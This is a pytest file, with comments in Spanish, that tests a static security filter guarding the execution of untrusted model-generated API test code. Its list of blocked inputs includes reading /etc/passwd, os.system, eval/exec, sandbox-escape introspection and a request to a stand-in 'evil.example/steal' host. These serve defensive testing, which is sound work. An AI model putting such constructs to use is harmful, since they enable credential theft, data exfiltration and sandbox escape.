"""Pruebas de la revisión de seguridad de scripts/score_measure.py.

Ese script EJECUTA código generado por un modelo (no confiable), así que su filtro estático es
un control de seguridad y se prueba como tal: lo legítimo pasa y cada construcción peligrosa se bloquea.
"""
import json
import pathlib
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / "scripts"))
import score_measure  # noqa: E402

GOOD = '''
import json
import uuid
import pytest
import requests

BASE_URL = "https://restful-booker.herokuapp.com"

def test_ok():
    r = requests.post(f"{BASE_URL}/auth", json={"username": "a" + uuid.uuid4().hex}, timeout=30)
    assert r.status_code == 200
'''


def test_legitimate_generated_code_passes():
    assert score_measure.is_safe(GOOD) == (True, "")


def test_real_baseline_api_code_passes_the_filter():
    # El código real que generó el modelo en la línea base no debe quedar bloqueado sin motivo.
    base = pathlib.Path(__file__).resolve().parents[2] / ".groq-measure" / "baseline-v1.json"
    if not base.exists():
        pytest.skip("no existe la medición base local")
    for row in json.loads(base.read_text(encoding="utf-8")):
        if row["demo"] == "apitests":
            assert score_measure.is_safe(row["text"])[0], row["example"]


@pytest.mark.parametrize("code", [
    "import os\nos.system('x')",
    "from os import path",
    "import subprocess",
    "import socket",
    "import shutil",
    "from pathlib import Path",
    "import sys",
    "import importlib",
    "open('/etc/passwd')",
    "eval('1+1')",
    "exec('x=1')",
    "compile('x', 'f', 'exec')",
    "__import__('os')",
    "input()",
    "getattr(__builtins__, 'ex' + 'ec')",
    "x = ().__class__.__bases__",
    "globals()['x']",
    "vars()",
    "type('A', (), {})",
    "import requests\nrequests.get('http://evil.example/steal')",
    "import requests\nrequests.get('https://restful-booker.herokuapp.com.evil.example/x')",
    "def f(:\n  pass",
])
def test_dangerous_or_invalid_code_is_blocked(code):
    ok, why = score_measure.is_safe(code)
    assert not ok and why


def test_blocked_code_is_never_executed(monkeypatch):
    called = []
    monkeypatch.setattr(score_measure.subprocess, "run", lambda *a, **k: called.append(a))
    passed, failed, xfail, note = score_measure.run_api_code("import os\nos.system('x')", "malo")
    assert (passed, failed, xfail) == (None, None, None)
    assert "bloqueado por seguridad" in note
    assert called == []


def test_trap_signals_are_detected_in_the_known_baseline_phrases():
    row = {"demo": "testcases", "example": "login", "mode": "live", "text": "Ingresar usuario con 256 caracteres. Clic en Entrar."}
    assert len(score_measure.score_row(row, execute_api=False)["traps"]) >= 2


def test_format_checks_count_markdown_bold_and_non_breaking_hyphens():
    row = {"demo": "testcases", "example": "reserva", "mode": "live", "text": "**Titulo** 2026‑10-15"}
    out = score_measure.score_row(row, execute_api=False)
    assert out["bold"] == 2 and out["nb_hyphen"] == 1
